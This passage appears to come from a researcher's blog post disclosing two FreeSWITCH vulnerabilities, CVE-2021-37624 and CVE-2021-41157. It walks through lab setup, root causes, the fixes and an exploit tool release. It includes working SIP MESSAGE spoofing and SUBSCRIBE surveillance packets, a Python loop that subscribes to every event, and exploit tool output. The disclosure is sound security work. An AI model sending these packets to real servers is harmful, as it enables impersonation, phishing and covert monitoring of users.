<p>To install the server, checkout the &ldquo;Building from Source&rdquo; section from <a href="https://freeswitch.org/confluence/display/FREESWITCH/Debian+10+Buster">here</a>. Make sure to pick a version less than v1.10.7. Once the server is installed, you might need some of the <a href="https://freeswitch.org/confluence/display/FREESWITCH/Debian+Post-Install+Tasks">post-installation instructions</a> to get it up and running.</p>
</li>
<li>
<p>After a clean install, you can confirm that FreeSWITCH status via the CLI interface using <code>fs_cli -rRS</code>.</p>
</li>
<li>
<p>Nexts its time to change the default passwords of the users for the installation now.</p>
<ul>
<li>First lets open <code>/usr/local/freeswitch/conf/vars.xml</code> in your favourite text editor.</li>
<li>Then, change the default password field by editing the value of data in the line:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;X-PRE-PROCESS</span> <span style="color:#a6e22e">cmd=</span><span style="color:#e6db74">&#34;set&#34;</span> <span style="color:#a6e22e">data=</span><span style="color:#e6db74">&#34;default_password=1234&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span></code></pre></div></li>
<li>Once the password has been changed, reload the FreeSWITCH service via the <code>reloadxml</code> command within the <code>fs_cli</code> shell.</li>
</ul>
</li>
<li>
<p>The default installation comes with 19 pre-configured users for testing purposes. You can create additional new users if you want. Just for the sake of simplicity we&rsquo;ll make use of the pre-built users in the system.</p>
<blockquote>
<p>NOTE: If you&rsquo;re creating new users, make sure to edit the dialplan configuration under <code>/usr/local/freeswitch/conf/dialplan/default.xml</code>.</p></blockquote>
</li>
<li>
<p>Once the users have been set up, we can now configure softphones to register with the server. For our example, we&rsquo;ll use the Zoiper softphone. Here&rsquo;s how to configure it:</p>
<ul>
<li>On the login page of Zoiper, we need to enter the username &ndash; which takes the form of <code>&lt;extension&gt;@&lt;ip&gt;</code>, where the extension can be any one of the prebuilt ones and the IP is the network address of the server.</li>
<li>For the password, let&rsquo;s enter the changed default password that we configured previously.</li>
</ul>
</li>
<li>
<p>The registration should succeed immediately, which can be confirmed via the <code>fs_cli</code> interface by typing <code>show registrations</code>.</p>
</li>
</ul>
<p>Nice, we now have a VoIP server up and running.</p>
<h2 id="the-vulnerabilities">The Vulnerabilities</h2>
<h3 id="1-missing-authentication-on-sip-message-packets-cve-2021-37624">1. Missing authentication on SIP MESSAGE packets (CVE-2021-37624)</h3>
<p>SIP MESSAGE, defined by <a href="https://datatracker.ietf.org/doc/html/rfc3428">RFC 3428</a>, provide a way to communicate between SIP user agents in form of messages. Messages are similar to short message service (SMS) mainly used for chat purposes between extensions (phone numbers). FreeSWITCH supports the SIP MESSAGE functionality as per the RFC.</p>
<p>IThe vulnerability lies in the default setup of a FreeSWITCH server where it didn&rsquo;t validate the authenticity/origin of SIP MESSAGE packets. This means that an unauthenticated attacker could send messages on behalf of someone else. Additionally, since no authentication is required, chat messages can be spoofed to appear to come from trusted contacts. Abuse of this bug can lead to issues like spam and enable other attacks like phishing, social engineering, etc. Imagine opening your phone in the morning and seeing this message just to hit a panic attack!</p>

    <img src="message.png"  alt="message"  class="center"  />


<p>To exploit the bug, anyone can simply send this packet to the vulnerable FreeSWITCH server, whose IP in my case is <code>192.168.0.107</code> with extension <code>1005</code>. The attacker machine IP is <code>192.168.0.105</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">MESSAGE</span> <span style="color:#960050;background-color:#1e0010">sip:</span><span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span> <span style="color:#960050;background-color:#1e0010">SIP/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Via:</span> <span style="color:#960050;background-color:#1e0010">SIP/</span><span style="color:#ae81ff">2.0</span><span style="color:#960050;background-color:#1e0010">/UDP</span> <span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.105</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38626</span><span style="color:#960050;background-color:#1e0010">;rport;branch=z</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">hG</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">bK-BpLnfgDs</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">From:</span> <span style="color:#e6db74">&#34;FBI&#34;</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">022-324-3000</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span><span style="color:#960050;background-color:#1e0010">&gt;;tag=c</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">WD</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">F</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">q</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">To:</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">CSeq:</span> <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">MESSAGE</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/plain</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent:</span> <span style="color:#960050;background-color:#1e0010">Infected</span> <span style="color:#960050;background-color:#1e0010">Phone</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Call-ID:</span> <span style="color:#960050;background-color:#1e0010">NfHK</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">84</span><span style="color:#960050;background-color:#1e0010">jjJkwzDkh</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Contact:</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">022-324-3000</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span><span style="color:#960050;background-color:#1e0010">;transport=udp&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Max-Forwards:</span> <span style="color:#ae81ff">70</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">FBI</span> <span style="color:#960050;background-color:#1e0010">here.</span> <span style="color:#960050;background-color:#1e0010">Open</span> <span style="color:#960050;background-color:#1e0010">your</span> <span style="color:#960050;background-color:#1e0010">door!</span>
</span></span></code></pre></div><p>Let&rsquo;s try to debug the root cause behind this. FreeSWITCH uses the Sofia library for providing SIP functionalities, and its configuration is located at <code>src/mod/endpoints/mod_sofia/conf/sofia.conf.xml</code>. Before commit <code>5c6fd51</code>, <a href="https://github.com/signalwire/freeswitch/blob/9376db0aae8422787ba9e688fd263814c16d9ed5/src/mod/endpoints/mod_sofia/conf/sofia.conf.xml#L320">L320</a> used to have a parameter named <code>auth-messages</code> (which was a flag to authenticate packets), with a default value set to <code>false</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- &lt;param name=&#34;auth-messages&#34; value=&#34;false&#34;/&gt; --&gt;</span>
</span></span></code></pre></div>
    <img src="bugmessage.png"  alt="message"  class="center"  />


<p>The team addressed the issue by removing <code>auth-messages</code> and introducing a new parameter <code>disable-auth-messages</code> with a higher priority. All versions greater than v1.10.6 now authenticates all messages by default.</p>

    <img src="msgfix.png"  alt="message"  class="center"  />


<p><strong>Reference:</strong></p>
<ul>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/432bfc0c45de62cdf146ad3870f8b8d351c5c22b"><code>432bfc0</code></a></li>
</ul>
<h3 id="2-missing-authentication-on-sip-subscribe-packets-cve-2021-41157">2. Missing authentication on SIP SUBSCRIBE packets (CVE-2021-41157)</h3>
<p>SIP SUBSCRIBE, defined by <a href="https://datatracker.ietf.org/doc/html/rfc6665#section-3.1">RFC 6665</a>, provides a way to get the current state and status updates from a remote extension. The updates are sent via SIP NOTIFY messages to the requesting endpoint. The story above repeats itself in this case where FreeSWITCH again doesn&rsquo;t authenticate the endpoint requesting a subscription to events. Abuse of this vulnerability allows anyone to subscribe to event notifications without authenticating. This poses privacy concerns such as monitoring of the user activity, social engineering or similar attacks &ndash; essentially converting FreeSWITCH to a survelliance system!</p>
<p>To reproduce the vulnerability, one has to initiate a <code>dialog</code> SUBSCRIBE request to the extension on a vulnerable FreeSWITCH setup. My setup remains the same as above:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>SUBSCRIBE sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">192.168.0.107</span>;transport<span style="color:#f92672">=</span>UDP SIP<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span>Via: SIP<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span><span style="color:#f92672">/</span>UDP <span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">12701</span>;rport;branch<span style="color:#f92672">=</span>z9hG4bK<span style="color:#f92672">-</span>BpLnfgDsc2
</span></span><span style="display:flex;"><span>To: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">192.168.0.107</span>:<span style="color:#ae81ff">5000</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>From: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">6969</span><span style="color:#f92672">@</span><span style="color:#ae81ff">1005</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>;tag<span style="color:#f92672">=</span>WD8F2qNf
</span></span><span style="display:flex;"><span>Contact: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">12701</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>Accept: <span style="color:#f92672">*/*</span>
</span></span><span style="display:flex;"><span>Max<span style="color:#f92672">-</span>Forwards: <span style="color:#ae81ff">70</span>
</span></span><span style="display:flex;"><span>Expires: <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span>User<span style="color:#f92672">-</span>Agent: Infected Phone
</span></span><span style="display:flex;"><span>Call<span style="color:#f92672">-</span>ID: HK5a84jjJkwzDkh9h2fh
</span></span><span style="display:flex;"><span>CSeq: <span style="color:#ae81ff">1</span> SUBSCRIBE
</span></span><span style="display:flex;"><span>Event: dialog
</span></span><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>FreeSWITCH will immediately respond with a <code>202 Accepted</code> response.</p>

    <img src="sub200.png"  alt="message"  class="center"  />


<p>Note that the <code>Allow-Events</code> header has multiple values, which means we can subscribe to those specified events and get updates about the user activity.</p>
<p>The next set of steps is obvious. We need to send SUBSCRIBE messages for all those events and wait for the server to <code>NOTIFY</code> us about them. A pseudocode representation in Python would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>all_events <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;talk&#34;</span>, <span style="color:#e6db74">&#34;conference&#34;</span>, <span style="color:#e6db74">&#34;as-feature-event&#34;</span>, <span style="color:#e6db74">&#34;hold&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;dialog&#34;</span>, <span style="color:#e6db74">&#34;line-seize&#34;</span>, <span style="color:#e6db74">&#34;call-info&#34;</span>, <span style="color:#e6db74">&#34;sla&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;include-session-description&#34;</span>, <span style="color:#e6db74">&#34;presence&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;presence.winfo&#34;</span>, <span style="color:#e6db74">&#34;message-summary&#34;</span>, <span style="color:#e6db74">&#34;refer&#34;</span>,
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> event <span style="color:#f92672">in</span> all_events:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send the subscribe requests</span>
</span></span><span style="display:flex;"><span>    socket<span style="color:#f92672">.</span>send(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;SUBSCRIBE sip:1005@192.168.0.107;transport=UDP SIP/2.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Via: SIP/2.0/UDP 192.168.0.105:52870;rport;branch=z9hG4bK-fUVuS9jZ8u
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Accept: */*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    To: &lt;sip:1005@192.168.0.107:5060;transport=UDP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    From: &lt;sip:6969@192.168.0.107:5060;transport=UDP&gt;;tag=VbhV3vC5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Contact: &lt;sip:1005@192.168.0.105:52870;transport=UDP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Max-Forwards: 70
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Expires: 600
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    User-Agent: Infected Phone
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Call-ID: AWX39IVUWSP2NcHciWvq
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    CSeq: 1 SUBSCRIBE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Event: </span><span style="color:#e6db74">{</span>event<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Content-Length: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>)
</span></span></code></pre></div><p>Once, the packets have been sent, all we need to do is just sit back and listen for connections. For every SUBSCRIBE packet sent, a <code>202 Accepted</code> response should be immediately received with the <code>Subscription-State</code> header set to <code>active</code> &ndash; indicating that the subscription has been accepted.</p>

    <img src="notifyack.png"  alt="message"  class="center"  />


<p>Thereafter, as the user performs actions (e.g. deregister their softphone, take a phone call, etc), notifications would be sent back to our listener.</p>

    <img src="notifyping.png"  alt="message"  class="center"  />


<p>SIP NOTIFY bodies use XML (<a href="https://datatracker.ietf.org/doc/html/rfc3680">RFC 3680</a>). The below screenshot shows us an example of a NOTIFY body sent back to us indicating that the extension <code>1005</code> is <em>available</em> now.</p>

    <img src="notifybody.png"  alt="message"  class="center"  />


<p>To understand the root cause of this, lets dig into the source code. Prior to commit <code>0924fed</code> in file <a href="https://github.com/signalwire/freeswitch/blob/601960eb44556e2a5faeba2bf5ba3520ec4b2cbb/src/mod/endpoints/mod_sofia/conf/sofia.conf.xml#L320"><code>sofia.conf.xml</code></a> &ndash; there was a <code>auth-subscriptions</code> parameter whose default value was set to <code>false</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- &lt;param name=&#34;auth-subscriptions&#34; value=&#34;false&#34;/&gt; --&gt;</span>
</span></span></code></pre></div>
    <img src="subbug.png"  alt="message"  class="center"  />


<p>The developers fixed this vulnerability by deprecating <code>auth-subscriptions</code> and introducing a <code>disable-auth-subscriptions</code> parameter with a default value set to <code>false</code> in the Sofia config file. Additionally, the <code>auth-subscriptions</code> parameter has been turned to <code>true</code> for all default profiles in FreeSWITCH.</p>

    <img src="subfix.png"  alt="message"  class="center"  />


<p><strong>References:</strong></p>
<ul>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/0924fed31da410760b50b4c3ddc08bded889e50c"><code>0924fed</code></a></li>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e"><code>b21dd4e</code></a></li>
</ul>
<h2 id="fixes">Fixes</h2>
<p>The fixes for both the misconfigurations are out and upgrading to v1.10.7 will do the necessary. The same patches have been pulled into the official upstream package repositories in Debian and others, so updating via the package repositories will also do.</p>
<p>Let us quickly take a look at the status quo of the vulnerabilities. A quick <a href="https://www.shodan.io/search/report?query=freeswitch+-%221.10.7%22">Shodan search</a> reveals the number of possibly vulnerable FreeSWITCH servers out there on the internet. Below is a map showing the distribution of the vulnerable servers across the globe.</p>

    <img src="map.png"  alt="message"  class="center"  />


<p>Here&rsquo;s the facet analysis graph of the servers mapped to popular cloud providers:</p>

    <img src="facet.png"  alt="message"  class="center"  />


<h2 id="tool-release">Tool Release</h2>
<p>It is my personal opinion that it&rsquo;s the job of the researcher to release proof of concepts through which the vulnerability can be reproduced. Adhering to my principle, I&rsquo;m releasing a tool called <strong>PewSWITCH</strong> (I suck at names :D) to <em>pew pew pew</em> a vulnerableFreeSWITCH server. You can get the tool and detailed instructions on my <a href="https://github.com/0xInfection/PewSWITCH">GitHub</a>.</p>
<p>Let&rsquo;s quickly demo the tool against my setup. To run the tool, I&rsquo;ll quickly grab a binary from the <a href="https://github.com/0xInfection/PewSWITCH/releases">releases</a> section and fire it away:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ ./pewswitch-linux64 -exts <span style="color:#ae81ff">1005</span> <span style="color:#ae81ff">192.168</span>.0.107
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     ___    .        ____       _ __      __
</span></span><span style="display:flex;"><span>    / _ \___|\    __/ __/|   __(_) /_____/ /
</span></span><span style="display:flex;"><span>   / ___/ -_) |/|/ /\ \| |/|/ / / __/ __/ _ \
</span></span><span style="display:flex;"><span>  /_/   \__/|__,__/___/|__,__/_/\__/\__/_//_/  v0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;where we pew pew pew freeswitch&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> No port supplied, using <span style="color:#66d9ef">default</span> port <span style="color:#ae81ff">5060</span> <span style="color:#66d9ef">for</span> targets...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Checking <span style="color:#66d9ef">if</span> hosts are alive and responding to SIP...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Host <span style="color:#ae81ff">192.168</span>.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span> is up and responding to SIP.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Heuristics indicate that the server is FreeSWITCH.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Using output directory ./pewswitch-results/ under /home/infected/Projects/pewswitch...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Starting scan at<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16.436642136</span> <span style="color:#ae81ff">+0530</span> IST m=<span style="color:#ae81ff">+0.003288205</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Sent <span style="color:#e6db74">&#34;FBI here. Open your door!&#34;</span> to <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>!
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Exploit completed <span style="color:#66d9ef">for</span> CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">37624</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Trying to subscribe extension <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">60</span> seconds...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> talk
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> hold
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> conference
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> as-feature-event
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> dialog
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> line-seize
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> call-info
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> sla
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> include-session-description
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> presence
